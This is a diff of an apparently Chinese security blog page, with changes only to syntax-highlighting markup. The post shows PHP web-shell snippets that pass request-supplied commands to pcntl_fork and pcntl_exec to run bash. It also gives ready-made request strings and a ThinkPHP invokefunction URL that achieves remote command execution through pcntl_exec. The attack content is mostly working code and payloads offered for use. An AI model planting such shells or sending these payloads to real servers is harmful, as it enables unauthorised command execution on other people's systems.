@@ -39,83 +39,83 @@
       
       <p>2019.8.1更新</p>
 <p>这样子执行完就不会多出来<defunc>的进程，也不会多出来<code>php-fpm</code>进程:</p>
-<div class="highlight"><pre><span></span><span class="o">&lt;</span>?<span class="nv">php</span>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
 
-<span class="cm">/**</span>
-<span class="cm"> * 子进程通过信号kill自己,也可以在父进程中发送kil信号结束子进程</span>
-<span class="cm"> */</span>
+<span class="sd">/**</span>
+<span class="sd"> * 子进程通过信号kill自己,也可以在父进程中发送kil信号结束子进程</span>
+<span class="sd"> */</span>
 
-<span class="o">//</span>生成子进程
-<span class="mh">$c</span><span class="nv">md</span> <span class="o">=</span> $<span class="nv">_REQUEST</span>[<span class="s1">&#39;</span><span class="s">cmd</span><span class="s1">&#39;</span>]<span class="c1">;</span>
-$<span class="nv">pid</span> <span class="o">=</span> <span class="nv">pcntl_fork</span><span class="ss">()</span><span class="c1">;</span>
-<span class="k">if</span><span class="ss">(</span>$<span class="nv">pid</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="ss">)</span>{
-    <span class="nv">die</span><span class="ss">(</span><span class="s1">&#39;</span><span class="s">could not fork</span><span class="s1">&#39;</span><span class="ss">)</span><span class="c1">;</span>
-}<span class="k">else</span>{
-    <span class="k">if</span><span class="ss">(</span>$<span class="nv">pid</span><span class="ss">)</span>{
-        $<span class="nv">status</span> <span class="o">=</span> <span class="mi">0</span><span class="c1">;</span>
-        <span class="nv">pcntl_exec</span><span class="ss">(</span><span class="mh">$c</span><span class="nv">md</span>[<span class="mi">0</span>], <span class="mh">$c</span><span class="nv">md</span>[<span class="mi">1</span>]<span class="ss">)</span><span class="c1">;</span>
-        <span class="nv">posix_kill</span><span class="ss">(</span><span class="nv">getmypid</span><span class="ss">()</span>,<span class="mi">9</span><span class="ss">)</span><span class="c1">;</span>
-<span class="o">//</span>阻塞父进程，直到子进程结束，不适合需要长时间运行的脚本.
-        <span class="o">//</span>可使用<span class="nv">pcntl_wait</span><span class="ss">(</span>$<span class="nv">status</span>, <span class="nv">WNOHANG</span><span class="ss">)</span>实现非阻塞式
+<span class="c1">//生成子进程</span>
+<span class="nv">$cmd</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">];</span>
+<span class="nv">$pid</span> <span class="o">=</span> <span class="nb">pcntl_fork</span><span class="p">();</span>
+<span class="k">if</span><span class="p">(</span><span class="nv">$pid</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
+    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;could not fork&#39;</span><span class="p">);</span>
+<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$pid</span><span class="p">){</span>
+        <span class="nv">$status</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="nb">pcntl_exec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nv">$cmd</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+        <span class="nb">posix_kill</span><span class="p">(</span><span class="nb">getmypid</span><span class="p">(),</span><span class="mi">9</span><span class="p">);</span>
+<span class="c1">//阻塞父进程，直到子进程结束，不适合需要长时间运行的脚本.</span>
+        <span class="c1">//可使用pcntl_wait($status, WNOHANG)实现非阻塞式</span>
 
-        <span class="nv">pcntl_wait</span><span class="ss">(</span>$<span class="nv">status</span><span class="ss">)</span><span class="c1">;</span>
-        <span class="k">exit</span><span class="c1">;</span>
-    }
-}
-</pre></div>
+        <span class="nb">pcntl_wait</span><span class="p">(</span><span class="nv">$status</span><span class="p">);</span>
+        <span class="k">exit</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
 
 
 <p><code>cmd[0]=/bin/bash&amp;cmd[1][0]=-c&amp;cmd[1][1]=ping%20baidu.com%20%26%26%20pkill%20php-fpm</code></p>
 <p><strong>执行命令的时候不要阻塞，不要阻塞,不要阻塞(举个例子，ping baidu.com就很蠢了)</strong></p>
 <hr>
-<div class="highlight"><pre><span></span><span class="err">参数执行</span><span class="o">:</span>
+<div class="highlight"><pre><span></span><code><span class="err">参数执行</span><span class="o">:</span>
 <span class="n">pcntl_exec</span><span class="o">(</span><span class="s2">&quot;/bin/bash&quot;</span><span class="o">,</span><span class="n">array</span><span class="o">(</span><span class="s2">&quot;-c&quot;</span><span class="o">,</span><span class="s2">&quot;id &gt; 1.txt&quot;</span><span class="o">))</span> <span class="c1">//返回值可能是502</span>
 
 <span class="err">执行脚本</span><span class="o">:</span>
 <span class="n">pcntl_exec</span><span class="o">(</span><span class="s2">&quot;/tmp/script&quot;</span><span class="o">)</span>   <span class="c1">//返回值502</span>
-</pre></div>
+</code></pre></div>
 
 
-<div class="highlight"><pre><span></span>返回值<span class="mi">200</span>
-<span class="o">&lt;</span>?<span class="nv">php</span>
-<span class="mh">$c</span><span class="nv">md</span> <span class="o">=</span> $<span class="nv">_REQUEST</span>[<span class="s1">&#39;</span><span class="s">cmd</span><span class="s1">&#39;</span>]<span class="c1">;</span>
-<span class="k">if</span><span class="ss">(</span><span class="nv">function_exists</span><span class="ss">(</span><span class="s1">&#39;</span><span class="s">pcntl_exec</span><span class="s1">&#39;</span><span class="ss">))</span> {
-    <span class="nv">switch</span><span class="ss">(</span><span class="nv">pcntl_fork</span><span class="ss">())</span>{
-     <span class="nv">case</span> <span class="mi">0</span>:
-        <span class="nv">pcntl_exec</span><span class="ss">(</span><span class="mh">$c</span><span class="nv">md</span>[<span class="mi">0</span>], <span class="mh">$c</span><span class="nv">md</span>[<span class="mi">1</span>]<span class="ss">)</span><span class="c1">;</span>
-    <span class="nv">default</span>:
-          <span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">case 111</span><span class="s2">&quot;</span><span class="c1">;</span>
-    }
-} <span class="k">else</span> {
-        <span class="nv">echo</span> <span class="s1">&#39;</span><span class="s">不支持pcntl扩展</span><span class="s1">&#39;</span><span class="c1">;</span>
-}
-?<span class="o">&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="nx">返回值200</span>
+<span class="cp">&lt;?php</span>
+<span class="nv">$cmd</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">];</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;pcntl_exec&#39;</span><span class="p">))</span> <span class="p">{</span>
+    <span class="k">switch</span><span class="p">(</span><span class="nb">pcntl_fork</span><span class="p">()){</span>
+     <span class="k">case</span> <span class="mi">0</span><span class="o">:</span>
+        <span class="nb">pcntl_exec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nv">$cmd</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+    <span class="k">default</span><span class="o">:</span>
+          <span class="k">echo</span> <span class="s2">&quot;case 111&quot;</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s1">&#39;不支持pcntl扩展&#39;</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
 
 
-<span class="nv">cmd</span>[<span class="mi">0</span>]<span class="o">=/</span><span class="nv">bin</span><span class="o">/</span><span class="nv">bash</span><span class="o">&amp;</span><span class="nv">cmd</span>[<span class="mi">1</span>][<span class="mi">0</span>]<span class="o">=-</span><span class="nv">c</span><span class="o">&amp;</span><span class="nv">cmd</span>[<span class="mi">1</span>][<span class="mi">1</span>]<span class="o">=</span><span class="nv">id</span> <span class="o">&gt;</span> <span class="o">/</span><span class="nv">tmp</span><span class="o">/</span><span class="nv">xxx</span>.<span class="nv">txt</span>
+<span class="nx">cmd</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="err">/bin/bash&amp;cmd[1][0]=-c&amp;cmd[1][1]=id &gt; /tmp/xxx.txt</span>
 
-<span class="o">/</span><span class="nv">index</span>.<span class="nv">php</span>?<span class="nv">s</span><span class="o">=/</span><span class="nv">index</span><span class="o">/</span>\<span class="nv">think</span>\<span class="nv">app</span><span class="o">/</span><span class="nv">invokefunction</span><span class="o">&amp;</span><span class="nv">function</span><span class="o">=</span><span class="nv">call_user_func_array</span><span class="o">&amp;</span><span class="nv">vars</span>[<span class="mi">0</span>]<span class="o">=</span><span class="nv">pcntl_exec</span><span class="o">&amp;</span><span class="nv">vars</span>[<span class="mi">1</span>][<span class="mi">0</span>]<span class="o">=/</span><span class="nv">bin</span><span class="o">/</span><span class="nv">bash</span><span class="o">&amp;</span><span class="nv">vars</span>[<span class="mi">1</span>][<span class="mi">1</span>][<span class="mi">0</span>]<span class="o">=/</span><span class="nv">tmp</span><span class="o">/</span><span class="mi">1</span>.<span class="nv">sh</span>
-</pre></div>
+<span class="err">/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=pcntl_exec&amp;vars[1][0]=/bin/bash&amp;vars[1][1][0]=/tmp/1.sh</span>
+</code></pre></div>
 
 
-<div class="highlight"><pre><span></span><span class="o">&lt;</span>?<span class="nv">php</span>
-<span class="nv">header</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">Content-Type: text/plain</span><span class="s2">&quot;</span><span class="ss">)</span><span class="c1">;</span>
-<span class="mh">$c</span><span class="nv">md</span><span class="o">=</span><span class="s2">&quot;</span><span class="s">/tmp/exec</span><span class="s2">&quot;</span><span class="c1">;</span>
-@<span class="k">unlink</span><span class="ss">(</span><span class="mh">$c</span><span class="nv">md</span><span class="ss">)</span><span class="c1">;</span>
-@<span class="k">unlink</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">/tmp/output</span><span class="s2">&quot;</span><span class="ss">)</span><span class="c1">;</span>
-<span class="mh">$c</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="s">#!/usr/bin/env bash</span><span class="se">\n</span><span class="s">uname -a &gt; /tmp/output</span><span class="se">\n</span><span class="s2">&quot;</span><span class="c1">;</span>
-<span class="nv">file_put_contents</span><span class="ss">(</span><span class="mh">$c</span><span class="nv">md</span>, <span class="mh">$c</span><span class="ss">)</span><span class="c1">;</span>
-<span class="nv">chmod</span><span class="ss">(</span><span class="mh">$c</span><span class="nv">md</span>, <span class="mi">0777</span><span class="ss">)</span><span class="c1">;</span>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-Type: text/plain&quot;</span><span class="p">);</span>
+<span class="nv">$cmd</span><span class="o">=</span><span class="s2">&quot;/tmp/exec&quot;</span><span class="p">;</span>
+<span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
+<span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;/tmp/output&quot;</span><span class="p">);</span>
+<span class="nv">$c</span> <span class="o">=</span> <span class="s2">&quot;#!/usr/bin/env bash</span><span class="se">\n</span><span class="s2">uname -a &gt; /tmp/output</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
+<span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span> <span class="nv">$c</span><span class="p">);</span>
+<span class="nb">chmod</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span> <span class="mo">0777</span><span class="p">);</span>
 
-<span class="nv">switch</span> <span class="ss">(</span><span class="nv">pcntl_fork</span><span class="ss">())</span> {
-  <span class="nv">case</span> <span class="mi">0</span>:
-    $<span class="nv">ret</span> <span class="o">=</span> <span class="nv">pcntl_exec</span><span class="ss">(</span><span class="mh">$c</span><span class="nv">md</span><span class="ss">)</span><span class="c1">;</span>
-    <span class="k">exit</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">case 0</span><span class="s2">&quot;</span><span class="ss">)</span><span class="c1">;</span>
-  <span class="nv">default</span>:
-    <span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">case 1</span><span class="s2">&quot;</span><span class="c1">;</span>
-    <span class="k">break</span><span class="c1">;</span>
-}
-</pre></div>
+<span class="k">switch</span> <span class="p">(</span><span class="nb">pcntl_fork</span><span class="p">())</span> <span class="p">{</span>
+  <span class="k">case</span> <span class="mi">0</span><span class="o">:</span>
+    <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">pcntl_exec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
+    <span class="k">exit</span><span class="p">(</span><span class="s2">&quot;case 0&quot;</span><span class="p">);</span>
+  <span class="k">default</span><span class="o">:</span>
+    <span class="k">echo</span> <span class="s2">&quot;case 1&quot;</span><span class="p">;</span>
+    <span class="k">break</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
 
 
 <p>上面执行的脚本那行chmod不可以少</p>
